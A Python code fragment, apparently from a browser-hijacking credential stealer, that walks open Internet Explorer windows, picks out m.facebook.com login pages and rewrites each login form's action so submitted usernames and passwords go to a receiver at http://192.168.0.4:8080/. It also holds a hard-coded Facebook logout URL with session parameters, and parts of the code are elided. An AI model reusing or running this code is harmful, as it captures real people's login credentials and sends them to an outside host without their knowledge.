...
data_receiver = "http://192.168.0.4:8080/"

target_sites  = {}
target_sites["m.facebook.com"] = \
    {#"logout_url"      : None,
	 "logout_url"      : "https://m.facebook.com/logout.php?h=AfdchhxHzv4fagt1t-Y&t=1616576597&source=mtouch_logout_button&persist_locale=1&button_name=logout&button_location=settings",
     #"logout_form"     : "logout_form",
     "logout_form"     : "None",
     #"logout_form"     : "492320125128799",
     "login_form_index": 0,
     "owned"           : False}
    ...
    for browser in windows:
        ...
        if url.hostname in target_sites:
            ...
            try:
                ...
                print("browser_LocationUrl: %s" %browser.LocationUrl)
                login_page = urllib.quote(browser.LocationUrl)
                print("login_page: %s" %(login_page))
                print("\nlogin_index value: %s\n" %browser.Document.forms[login_index])
                #browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                browser.Document.forms[login_index].action = "%s" % (data_receiver)
                print("*******************************")
                print("\naction :%s\n" %(browser.Document.forms[login_index].action))
